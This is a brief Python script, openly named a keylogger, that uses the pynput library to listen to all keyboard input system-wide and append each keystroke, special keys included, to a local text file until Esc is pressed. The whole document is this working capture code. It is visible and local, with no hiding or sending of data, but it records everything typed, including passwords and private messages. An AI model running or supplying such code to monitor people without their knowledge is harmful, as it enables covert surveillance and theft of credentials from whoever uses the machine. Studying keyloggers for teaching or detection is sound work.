from pynput import keyboard

# File to save the keystrokes
log_file = "key_log.txt"

# Function to write keystrokes to the log file
def write_to_file(key):
    with open(log_file, "a") as file:
        file.write(f"{key}\n")

# Callback function when a key is pressed
def on_press(key):
    try:
        # Log the alphanumeric key pressed
        write_to_file(key.char)
    except AttributeError:
        # Log special keys (e.g., space, enter, backspace)
        write_to_file(str(key))

# Callback function when a key is released
def on_release(key):
    # Stop the listener if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Main function to start the keylogger
def main():
    print("Keylogger is running... Press 'Esc' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
